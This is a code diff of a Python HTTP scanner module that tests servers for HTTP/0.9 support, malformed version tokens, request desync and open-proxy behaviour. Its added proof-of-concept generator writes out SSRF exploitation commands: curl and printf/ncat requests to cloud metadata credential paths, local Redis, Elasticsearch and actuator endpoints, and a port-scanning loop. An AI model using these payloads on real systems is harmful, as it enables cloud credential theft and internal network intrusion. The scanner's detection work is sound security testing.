+
+    hits = sum(1 for pair in marker_pairs if all(m in lower for m in pair))
+    return hits >= 2
 
 
-def confirm_proxy_behavior(scheme: str, host: str, port: int) -> bool:
-    """Test de confirmation avec httpbin.org/ip"""
+def _confirm_proxy_with_ip(target: ParsedURL) -> bool:
+    """Confirmation via httpbin.org/ip (different endpoint)."""
     try:
-        confirm_url = "http://httpbin.org/ip"
-        payload = f"GET {confirm_url}\r\nHost: httpbin.org\r\n\r\n".encode()
-        
-        s: socket.socket | ssl.SSLSocket
-        if scheme == "https":
-            s = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-        else:
-            s = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-        
-        resp = send_recv(s, payload, read_timeout=DEFAULT_READ_TIMEOUT)
-        s.close()
-        
-        # Structure JSON spécifique de httpbin/ip
-        if (b'"origin":' in resp and 
-            resp.count(b'"') >= 4 and
-            b'.' in resp and
-            len(resp) < 500):
-            
-            if not any(x in resp.lower() for x in [b'<html', b'error', b'exception', b'404']):
+        payload = (
+            f"GET {PROXY_CONFIRM_URL}\r\n"
+            f"Host: httpbin.org\r\n\r\n"
+        ).encode()
+        sock = create_socket(target, force_h1=True)
+        resp = send_recv(sock, payload)
+        sock.close()
+
+        if (b'"origin":' in resp
+                and resp.count(b'"') >= 4
+                and b'.' in resp
+                and len(resp) < 500):
+            lower = resp.lower()
+            if not any(x in lower for x in (b'<html', b'error', b'404')):
                 return True
-                
     except Exception:
         pass
-    
     return False
 
 
-def check_for_false_positive(scheme: str, host: str, port: int) -> bool:
-    """Vérification avec une URL invalide pour détecter les faux positifs"""
+def _check_proxy_false_positive(target: ParsedURL) -> bool:
+    """Sends a request to an invalid domain. If 200 -> false positive."""
     try:
-        invalid_url = "http://this-domain-should-never-exist-xyz123456.invalid/nonexistent"
-        payload = f"GET {invalid_url}\r\nHost: this-domain-should-never-exist-xyz123456.invalid\r\n\r\n".encode()
-        
-        s: socket.socket | ssl.SSLSocket
-        if scheme == "https":
-            s = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_QUICK_TIMEOUT)
-        else:
-            s = socket.create_connection((host, port), timeout=DEFAULT_QUICK_TIMEOUT)
-        
-        resp = send_recv(s, payload, read_timeout=DEFAULT_QUICK_TIMEOUT)
-        s.close()
-        
-        # Réponse positive à une URL invalide = faux positif
-        first_line, code = first_line_and_code(resp)
-        if code and code == 200 and len(resp) > 100:
-            return True
-            
+        payload = (
+            f"GET {PROXY_INVALID_URL}\r\n"
+            f"Host: this-domain-should-never-exist-xyz123456.invalid\r\n\r\n"
+        ).encode()
+        sock = create_socket(target, force_h1=True, timeout=TIMEOUT_QUICK)
+        resp = send_recv(sock, payload, read_timeout=TIMEOUT_QUICK)
+        sock.close()
+
+        _, code = parse_status_line(resp)
+        return code == 200 and len(resp) > 100
     except Exception:
-        pass
-    
-    return False
+        return False
 
 
-def calculate_confidence_score(is_valid: bool, is_confirmed: bool, is_false_positive: bool) -> int:
-    """Calcule un score de confiance de 0 à 100%"""
-    if is_false_positive:
-        return 0
-    
-    score = 0
-    if is_valid:
-        score += 50
-    if is_confirmed:
-        score += 50
-    
-    return min(score, 100)
+def _build_proxy_poc(target: ParsedURL) -> list[str]:
+    """Generates reproduction instructions for open proxy."""
+    host = target.host
+    port = target.port
+    scheme = "https" if target.is_https else "http"
+    connect = _get_connect_cmd(target)
 
-
-def determine_rejection_reason(is_valid: bool, is_confirmed: bool, is_false_positive: bool) -> str:
-    """Détermine la raison du rejet d'une vulnérabilité"""
-    if is_false_positive:
-        return "False positive detected - server responds to invalid URLs"
-    elif not is_valid:
-        return "Response doesn't match expected proxy patterns"
-    elif not is_confirmed:
-        return "Could not confirm proxy with secondary test"
-    else:
-        return "Insufficient evidence of proxy"
-
-
-def test_http09_misconf(url: str) -> dict[str, Any]:
-    """Teste les vulnérabilités liées au support HTTP/0.9"""
-    scheme, host, port, path = parse_target(url)
-    results: dict[str, Any] = {}
-
-    leak_signatures = [
-        b"root:x:0:0",
-        b"[boot loader]",
-        b"[operating systems]",
-        b"<!DOCTYPE html",
-        b"index of /",
-        b"<title>phpinfo",
-        b"mysql_connect",
-        b"password",
-        b"secret",
-        b"config",
-        b"aws_access_key",
-        b"private_key",
+    return [
+        "OPEN PROXY (Forward Proxy / SSRF)",
+        "",
+        "Description:",
+        "  The server accepts absolute URLs in the request line and",
+        "  forwards the request to the host specified in the URL.",
+        "  It acts as an open HTTP proxy, allowing access to internal",
+        "  or external resources through the target server.",
+        "",
+        "Impact:",
+        "  - SSRF (Server-Side Request Forgery)",
+        "  - Access to cloud metadata (AWS/GCP/Azure IMDS)",
+        "  - Internal port scanning through the server",
+        "  - Firewall / NAC bypass to reach internal network",
+        "  - Data exfiltration using the server as a relay",
+        "",
+        "Reproduce with ncat/openssl:",
+        f"  $ printf 'GET http://httpbin.org/get\\r\\nHost: httpbin.org\\r\\n\\r\\n' | {connect}",
+        "",
+        "  Expected result: httpbin JSON response with 'origin' and 'url'.",
+        "  If you see this JSON, the server relayed the request.",
+        "",
+        "Reproduce with curl (proxy mode):",
+        f"  $ curl -x {scheme}://{host}:{port} http://httpbin.org/get",
+        f"  $ curl -x {scheme}://{host}:{port} http://169.254.169.254/latest/meta-data/",
+        "",
+        "Reproduce with Python:",
+        f'  import requests',
+        f'  proxies = {{"http": "{scheme}://{host}:{port}", "https": "{scheme}://{host}:{port}"}}',
+        f'  r = requests.get("http://httpbin.org/get", proxies=proxies)',
+        f'  print(r.text)  # Should contain "origin" and "url"',
+        "",
+        "Exploitation payloads:",
+        "",
+        "  Cloud metadata (critical SSRF):",
+        f'  $ printf "GET http://169.254.169.254/latest/meta-data/\\r\\nHost: 169.254.169.254\\r\\n\\r\\n" | {connect}',
+        f'  $ printf "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/\\r\\nHost: 169.254.169.254\\r\\n\\r\\n" | {connect}',
+        f'  $ printf "GET http://metadata.google.internal/computeMetadata/v1/?recursive=true\\r\\nHost: metadata.google.internal\\r\\nMetadata-Flavor: Google\\r\\n\\r\\n" | {connect}',
+        "",
+        "  Internal services:",
+        f'  $ printf "GET http://127.0.0.1:6379/INFO\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
+        f'  $ printf "GET http://127.0.0.1:9200/\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
+        f'  $ printf "GET http://localhost:8080/actuator/env\\r\\nHost: localhost\\r\\n\\r\\n" | {connect}',
+        "",
+        "  Port scanning:",
+        f'  $ for p in 22 80 443 3306 5432 6379 8080 9200; do',
+        f'      printf "GET http://127.0.0.1:$p/\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" | {connect}',
+        f'      echo "--- port $p ---"',
+        f'    done',
+        "",
+        "Verification:",
+        "  1. The httpbin.org/get response should contain the target server's",
+        "     IP in 'origin' (not your own IP)",
+        "  2. Test with Burp Collaborator or webhook.site to confirm",
+        "     the server is making the outbound request",
+        f"  3. Compare: direct curl vs curl -x {scheme}://{host}:{port}",
     ]
 
-    # Test 1: Desync Injection
-    try:
-        payload = f"GET {path}\n\rHTTP/1.1 200 OK\n\r\n\r".encode()
-        s: socket.socket | ssl.SSLSocket
-        if scheme == "https":
-            s = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-        else:
-            s = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-        resp_desync = send_recv(s, payload, read_timeout=DEFAULT_READ_TIMEOUT)
-        s.close()
 
-        is_vuln, reason = validate_vulnerability_response(resp_desync, "desync_injection")
-        results["desync_injection"] = is_vuln
-        results["desync_injection_reason"] = reason
+# ─────────────────────────────────────────────────────────────
+# Content leak analysis
+# ─────────────────────────────────────────────────────────────
 
-        if is_vuln:
-            results["desync_injection_payload"] = payload.decode(errors="replace")
-            results["desync_injection_response"] = resp_desync[:500]
-    except Exception as e:
-        results["desync_injection"] = False
-        results["desync_injection_reason"] = f"Error: {str(e)}"
+def scan_content_leaks(raw: bytes) -> list[str]:
+    """Scans a response for critical data leaks.
 
-    # Test 2: Pipeline Injection
-    try:
-        payload = f"GET {path}\n\rGET /admin\n\r".encode()
-        s2: socket.socket | ssl.SSLSocket
-        if scheme == "https":
-            s2 = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-        else:
-            s2 = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-        resp_pipeline = send_recv(s2, payload, read_timeout=DEFAULT_READ_TIMEOUT)
-        s2.close()
+    Ignores standard HTML pages to avoid false positives.
+    Only keeps truly critical signatures (private keys,
+    /etc/passwd, AWS credentials, etc.).
+    """
+    if not raw or len(raw) < 20:
+        return []
 
-        is_vuln, reason = validate_vulnerability_response(resp_pipeline, "pipeline_possible")
-        results["pipeline_possible"] = is_vuln
-        results["pipeline_possible_reason"] = reason
+    if is_html_page(raw):
+        return []
 
-        if is_vuln:
-            results["pipeline_possible_payload"] = payload.decode(errors="replace")
-            results["pipeline_possible_response"] = resp_pipeline[:500]
-    except Exception as e:
-        results["pipeline_possible"] = False
-        results["pipeline_possible_reason"] = f"Error: {str(e)}"
+    body = get_response_body(raw).lower()
+    leaks: list[str] = []
 
-    # Test 3: Proxy Path Confusion (amélioré)
-    try:
-        _tgt = urlparse(url)
-        _probe = urlparse(PROXY_PROBE_URL)
+    for signature, description in CRITICAL_LEAK_SIGNATURES:
+        if signature in body:
+            leaks.append(description)
 
-        if (_probe.hostname or "").lower() == (_tgt.hostname or "").lower():
-            results["proxy_path_confusion"] = False
-            results["proxy_path_confusion_exploit"] = "Test skipped - probe URL matches target host"
-        else:
-            payload1 = f"GET {PROXY_PROBE_URL}\r\nHost: httpbin.org\r\n\r\n".encode()
-            s3: socket.socket | ssl.SSLSocket
-            if scheme == "https":
-                s3 = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-            else:
-                s3 = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-            resp_proxy = send_recv(s3, payload1, read_timeout=DEFAULT_READ_TIMEOUT)
-            s3.close()
+    return leaks
 
-            is_valid_proxy_response = analyze_proxy_response(resp_proxy)
-            is_confirmed = False
-            if is_valid_proxy_response:
-                is_confirmed = confirm_proxy_behavior(scheme, host, port)
-            
-            false_positive_check = check_for_false_positive(scheme, host, port)
-            is_vuln = is_valid_proxy_response and is_confirmed and not false_positive_check
 
-            results["proxy_path_confusion"] = bool(is_vuln)
-            results["proxy_confidence"] = calculate_confidence_score(
-                is_valid_proxy_response, is_confirmed, false_positive_check
-            )
-
-            if is_vuln:
-                exploit_info = [
-                    "CONFIRMED PROXY VULNERABILITY:",
-                    "1. Server forwards absolute URLs to external hosts",
-                    "2. Can be used to bypass firewalls and access internal resources",
-                    "3. Potential for SSRF (Server-Side Request Forgery) attacks",
-                    "",
-                    "POC PAYLOADS:",
-                    "• GET http://169.254.169.254/latest/meta-data/ (AWS metadata)",
-                    "• GET http://metadata.google.internal/computeMetadata/v1/ (GCP metadata)",
-                    "• GET http://internal-server.local/admin (Internal services)",
-                    "• GET http://localhost:22 (Port scanning)",
-                    "• GET http://127.0.0.1:3306 (Database access)",
-                    "• GET http://127.0.0.1:6379 (Redis access)",
-                ]
-
-                results["proxy_path_confusion_exploit"] = "\n         ".join(exploit_info)
-                results["proxy_path_confusion_payload"] = f"Successful payload: {payload1.decode(errors='replace')}"
-                results["proxy_path_confusion_response"] = resp_proxy[:500]
-            else:
-                results["proxy_path_confusion_reason"] = determine_rejection_reason(
-                    is_valid_proxy_response, is_confirmed, false_positive_check
-                )
-
-    except Exception as e:
-        results["proxy_path_confusion"] = False
-        results["proxy_path_confusion_exploit"] = f"Test failed: {str(e)}"
-
-    # Analyse de fuite de contenu sensible
-    test_responses = [
-        ("desync_injection", results.get("desync_injection_response", b"")),
-        ("pipeline_possible", results.get("pipeline_possible_response", b"")),
-        ("proxy_path_confusion", results.get("proxy_path_confusion_response", b"")),
-    ]
-
-    for name, content in test_responses:
-        if content:
-            for sig in leak_signatures:
-                if sig in content.lower():
-                    results[f"{name}_content_leak"] = True
-                    results[f"{name}_leaked_signature"] = sig.decode(errors="replace")
-                    break
-
-    return results
-
+# ─────────────────────────────────────────────────────────────
+# Version probing (parallelized)
+# ─────────────────────────────────────────────────────────────
 
 def probe_single_version(
-    scheme: str, host: str, port: int, path: str, version: str
-) -> dict[str, Any]:
-    """Teste une seule version HTTP (pour parallélisation)"""
-    flags = classify_version_token(version)
-    req = None
-    try:
-        s: socket.socket | ssl.SSLSocket
-        if scheme == "https":
-            s = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-        else:
-            s = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
+    target: ParsedURL, version: str
+) -> VersionProbeResult:
+    """Sends an HTTP request with a specific version and analyzes the response."""
+    result = VersionProbeResult(
+        version=version,
+        flags=classify_version_token(version),
+    )
 
+    try:
+        sock = create_socket(target, force_h1=True)
         version_str = f" {version}" if version else ""
-        req = (
-            f"GET {path}{version_str}\r\n"
-            f"Host: {host}\r\n"
+        raw_req = (
+            f"GET {target.path}{version_str}\r\n"
+            f"Host: {target.host}\r\n"
             f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
             f"Accept-Encoding: gzip, deflate\r\n"
             f"Accept: */*\r\n"
             f"Connection: close\r\n\r\n"
         ).encode()
 
-        resp = send_recv(s, req, read_timeout=15)
-        s.close()
+        resp = send_recv(sock, raw_req, read_timeout=15)
+        sock.close()
 
-        resp = decompress_if_needed(resp)
-        header_info = analyze_response_headers(resp)
+        resp = decompress_body(resp)
+        fl, code = parse_status_line(resp)
 
-        fl, code = first_line_and_code(resp)
-        size = len(resp)
-        accepted = (code is not None and code < 400) or (code in (101,))
+        result.code = code
+        result.size = len(resp)
+        result.first_line = fl
+        result.accepted = (code is not None and code < 400) or code == 101
+        result.server = extract_server_header(resp)
 
-        return {
-            "version": version,
-            "code": code,
-            "size": size,
-            "first_line": fl,
-            "flags": flags,
-            "accepted": bool(accepted),
-            "raw_request": req.decode(errors="replace"),
-            "server": header_info.get("server", ""),
-            "content_type": header_info.get("content_type", ""),
-            "headers_info": header_info,
-        }
     except Exception as e:
-        return {
-            "version": version,
-            "code": None,
-            "size": 0,
-            "first_line": f"ERR: {e.__class__.__name__}",
-            "flags": flags,
-            "accepted": False,
-            "raw_request": req.decode(errors="replace") if req else "",
-        }
+        result.first_line = f"ERR: {e.__class__.__name__}"
+
+    return result
 
 
-def probe_weird_versions(url: str, versions: list[str]) -> list[dict[str, Any]]:
-    """Teste plusieurs versions HTTP en parallèle"""
-    scheme, host, port, path = parse_target(url)
-    results = []
+def probe_all_versions(
+    target: ParsedURL,
+    versions: list[str],
+    max_workers: int = 5,
+) -> list[VersionProbeResult]:
+    """Tests all HTTP versions in parallel."""
+    results: list[VersionProbeResult] = []
 
-    # Exécution parallèle avec ThreadPoolExecutor
-    with ThreadPoolExecutor(max_workers=5) as executor:
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
         futures = {
-            executor.submit(probe_single_version, scheme, host, port, path, v): v
+            pool.submit(probe_single_version, target, v): v
             for v in versions
         }
-        
         for future in as_completed(futures):
             try:
-                result = future.result()
-                results.append(result)
+                results.append(future.result())
             except Exception as e:
-                version = futures[future]
-                results.append({
-                    "version": version,
-                    "code": None,
-                    "size": 0,
-                    "first_line": f"ERR: {e.__class__.__name__}",
-                    "flags": classify_version_token(version),
-                    "accepted": False,
-                    "raw_request": "",
-                })
+                v = futures[future]
+                results.append(VersionProbeResult(
+                    version=v,
+                    first_line=f"ERR: {e.__class__.__name__}",
+                    flags=classify_version_token(v),
+                ))
 
-    # Tri par version pour cohérence d'affichage
-    results.sort(key=lambda x: versions.index(x["version"]))
+    order = {v: i for i, v in enumerate(versions)}
+    results.sort(key=lambda r: order.get(r.version, 999))
     return results
 
 
-def risk_badge(item: dict[str, Any]) -> str:
-    """Retourne un badge de risque si des flags suspects sont détectés"""
-    flags = set(item.get("flags", []))
-    if item.get("accepted") and flags.intersection(
-        {
-            "empty_version",
-            "leading_space",
-            "trailing_space",
-            "invalid_token",
-            "mixed_case",
-        }
-    ):
-        return f"{Colors.YELLOW}💡{Colors.RESET}"
+# ─────────────────────────────────────────────────────────────
+# Display helpers
+# ─────────────────────────────────────────────────────────────
+
+def risk_badge(result: VersionProbeResult) -> str:
+    """Returns a badge if the accepted version has anomalies."""
+    risky_flags = {
+        "empty_version", "leading_space", "trailing_space",
+        "invalid_token", "mixed_case",
+    }
+    if result.accepted and risky_flags.intersection(result.flags):
+        return f" {Colors.YELLOW}\U0001f4a1{Colors.RESET}"
     return ""
 
 
 def print_line(
     v: str, code: int | None, size: int, extra: str = "", server: str = ""
 ) -> None:
-    """Affiche une ligne formatée de résultat"""
-    code_str = f"{code}" if code is not None else "—"
+    """Prints a formatted result line."""
+    code_str = f"{code}" if code is not None else "\u2014"
     server_info = f" ({server[:30]})" if server and server != "Unknown" else ""
-    spaces3 = " " * 3
-    spaces5 = " " * 5
-    print(f" ├── {v:<15}: {code_str:<3}{spaces3}[{size}b]{server_info}{spaces5}{extra}")
+    print(f" \u251c\u2500\u2500 {v:<15}: {code_str:<3}   [{size}b]{server_info}     {extra}")
 
+
+def print_version_table(label: str, items: list[VersionProbeResult]) -> None:
+    """Prints a table of version probe results."""
+    print(f"\n \u251c\u2500\u2500 {label} ({len(items)}):")
+    for item in items:
+        v = item.version if item.version != "" else "<empty>"
+        flags = ",".join(item.flags) if item.flags else "N/A"
+        badge = risk_badge(item)
+        fl_sane = sanitize_status_line(item.first_line)
+        extra = f"{badge} [{fl_sane}] flags={flags}"
+        print_line(v, item.code, item.size, extra, item.server)
+
+
+def print_vuln_result(vr: VulnTestResult) -> None:
+    """Displays the result of a vulnerability test."""
+    if vr.vulnerable:
+        status = f"{Colors.RED}VULNERABLE{Colors.RESET}"
+    else:
+        status = f"{Colors.GREEN}SAFE{Colors.RESET}"
+
+    conf_str = ""
+    if vr.confidence > 0:
+        if vr.confidence >= 90:
+            conf_color = Colors.GREEN
+        elif vr.confidence >= 50:
+            conf_color = Colors.YELLOW
+        else:
+            conf_color = Colors.RED
+        conf_str = f" [{conf_color}{vr.confidence}%{Colors.RESET}]"
+
+    print(f"       - {vr.name}: {status}{conf_str}")
+    print(f"         \u2514\u2500 {vr.reason}")
+
+    if vr.vulnerable:
+        if vr.response_preview:
+            preview = repr(vr.response_preview[:150])
+            print(f"         \u2514\u2500 Response preview: {preview}...")
+
+        if vr.poc:
+            print(f"         \u2514\u2500 {Colors.CYAN}PoC / Reproduction:{Colors.RESET}")
+            for line in vr.poc:
+                print(f"         \u2502   {line}")
+
+    if vr.content_leaks:
+        for leak in vr.content_leaks:
+            print(f"         \u2514\u2500 {Colors.RED}LEAK DETECTED:{Colors.RESET} {leak}")
+
+
+# ─────────────────────────────────────────────────────────────
+# Main entry point
+# ─────────────────────────────────────────────────────────────
 
 def check_http_version(url: str) -> None:
-    """Fonction principale d'analyse des versions HTTP"""
-    print(f"{Colors.CYAN} ├ Version & protocol analysis{Colors.RESET}")
+    """Full HTTP version analysis and associated vulnerability checks.
 
-    versions = [
-        "HTTP/0.9",
-        "HTTP/1.0",
-        "HTTP/1.1",
-        "HTTP/1.6",
-        "HTTP/2",
-        "HTTP/3",
-        "QUIC",
-        "HtTP/1.1",
-        "SHTTP/1.3",
-        "HTTP/1.1.1",
-        "HTTP/1.2",
-        "HTTP/4.0",
-        "HTTP/99.9",
-        "INVALID/1.1",
-        "",
-        " HTTP/1.1",
-        "HTTP/1.1 ",
-    ]
+    1. Base connectivity test
+    2. ALPN detection (TLS)
+    3. HTTP/0.9 probe + vulnerability tests if supported
+    4. Probe all versions (standard + malformed) in parallel
+    5. Display accepted/rejected versions with anomaly flags
+    """
+    print(f"{Colors.CYAN} \u251c Version & protocol analysis{Colors.RESET}")
 
-    # Test de connectivité basique
+    target = ParsedURL.from_url(url)
+
+    # 1. Base connectivity
     try:
         requests.get(url, verify=False, allow_redirects=False, timeout=10)
     except Exception as e:
-        print(f" ├── Base connectivity error: {e}")
+        print(f" \u251c\u2500\u2500 Base connectivity error: {e}")
 
-    # Test HTTP/0.9
+    # 2. ALPN detection
+    if target.is_https:
+        alpn = detect_alpn_protocols(target)
+        if alpn:
+            print(f" \u251c\u2500\u2500 ALPN protocols: {', '.join(alpn)}")
+        else:
+            print(" \u251c\u2500\u2500 ALPN: no protocols detected")
+
+    # 3. HTTP/0.9 test + vulnerabilities
     try:
-        is09, sample = probe_http_09(url)
-        stat = f"{Colors.GREEN}Supported{Colors.RESET}" if is09 else f"{Colors.RED}Not supported{Colors.RESET}"
-        print(f" ├── HTTP/0.9: {stat} [{len(sample)} bytes]")
+        is_09, sample = probe_http09(target)
+        if is_09:
+            stat = f"{Colors.GREEN}Supported{Colors.RESET}"
+        else:
+            stat = f"{Colors.RED}Not supported{Colors.RESET}"
+        print(f" \u251c\u2500\u2500 HTTP/0.9: {stat} [{len(sample)} bytes]")
 
-        if is09:
-            misconf = test_http09_misconf(url)
-            main_tests = ["desync_injection", "pipeline_possible", "proxy_path_confusion"]
-            
-            for test_name in main_tests:
-                is_vulnerable = misconf.get(test_name, False)
+        if is_09:
+            connect = _get_connect_cmd(target)
+            print(f"         \u2514\u2500 {Colors.CYAN}PoC:{Colors.RESET} printf 'GET {target.path}\\r\\n\\r\\n' | {connect}")
 
-                if is_vulnerable:
-                    status = f"{Colors.RED}VULNERABLE{Colors.RESET}"
-                    print(f"       - {test_name}: {status}")
+            vuln_tests = [
+                test_desync_injection(target),
+                test_pipeline_injection(target),
+                test_open_proxy(target),
+            ]
 
-                    exploit_key = f"{test_name}_exploit"
-                    if exploit_key in misconf:
-                        print(f"         └─ {misconf[exploit_key]}")
-
-                    payload_key = f"{test_name}_payload"
-                    if payload_key in misconf:
-                        print(f"         └─ Test payload: {misconf[payload_key][:100]}...")
-
-                    response_key = f"{test_name}_response"
-                    if response_key in misconf:
-                        response_preview = misconf[response_key].decode(errors="replace")[:150]
-                        print(f"         └─ Response preview: {repr(response_preview)}...")
-                else:
-                    status = f"{Colors.GREEN}SAFE{Colors.RESET}"
-                    print(f"       - {test_name}: {status}")
-
-                    reason_key = f"{test_name}_reason"
-                    if reason_key in misconf:
-                        print(f"         └─ {misconf[reason_key]}")
-
-            # Score de confiance pour le test proxy
-            if 'proxy_confidence' in misconf:
-                confidence = misconf['proxy_confidence']
-                if confidence > 0:
-                    confidence_color = Colors.GREEN if confidence >= 90 else Colors.YELLOW if confidence >= 50 else Colors.RED
-                    print(f"       - Proxy confidence score: {confidence_color}{confidence}%{Colors.RESET}")
-
-            # Analyse de fuite de contenu
-            content_leak_tests = [k for k in misconf.keys() if k.endswith("_content_leak")]
-            if content_leak_tests:
-                print("       Content leak analysis:")
-                for leak_test in content_leak_tests:
-                    if misconf.get(leak_test, False):
-                        sig_key = leak_test.replace("_content_leak", "_leaked_signature")
-                        signature = misconf.get(sig_key, "Unknown signature")
-                        print(f"         - {leak_test}: {Colors.RED}DETECTED{Colors.RESET} ({signature})")
+            for vr in vuln_tests:
+                # Scan leaks only on confirmed vulnerabilities
+                if vr.vulnerable and vr.response_preview:
+                    vr.content_leaks = scan_content_leaks(
+                        vr.response_preview.encode(errors="replace")
+                    )
+                print_vuln_result(vr)
 
     except Exception as e:
-        print(f" ├── HTTP/0.9: error during enhanced testing: {e}")
+        print(f" \u251c\u2500\u2500 HTTP/0.9: error during testing: {e}")
         logger.exception("HTTP/0.9 testing error")
 
-    # Test des versions anormales (parallélisé)
-    weirds = probe_weird_versions(url, [v for v in versions if v != "HTTP/0.9"])
+    # 4. Probe all versions (parallelized)
+    versions_to_test = [v for v in TEST_VERSIONS if v != "HTTP/0.9"]
+    weirds = probe_all_versions(target, versions_to_test)
 
-    accepted_versions = [item for item in weirds if item["accepted"]]
-    rejected_versions = [item for item in weirds if not item["accepted"]]
+    accepted = [item for item in weirds if item.accepted]
+    rejected = [item for item in weirds if not item.accepted]
 
-    if accepted_versions:
-        print(f"\n ├── Accepted versions ({len(accepted_versions)}):")
-        for item in accepted_versions:
-            v = item["version"] if item["version"] != "" else "<empty>"
-            flags = ",".join(item["flags"]) if item["flags"] else "N/A"
-            badge = risk_badge(item)
-            fl_sane = sanitize_first_line(item["first_line"])
-            extra = f"{badge} [{fl_sane}] flags={flags}"
-            print_line(v, item["code"], item["size"], extra, item.get("server", ""))
+    if accepted:
+        print_version_table("Accepted versions", accepted)
 
-    if rejected_versions:
-        print(f"\n ├── Rejected/Error versions ({len(rejected_versions)}):")
-        for item in rejected_versions[:10]:  # Limite à 10 pour lisibilité
-            v = item["version"] if item["version"] != "" else "<empty>"
-            flags = ",".join(item["flags"]) if item["flags"] else "N/A"
-            badge = risk_badge(item)
-            fl_sane = sanitize_first_line(item["first_line"])
-            extra = f"{badge} [{fl_sane}] flags={flags}"
-            print_line(v, item["code"], item["size"], extra, item.get("server", ""))
+    if rejected:
+        print_version_table("Rejected/Error versions", rejected[:10])
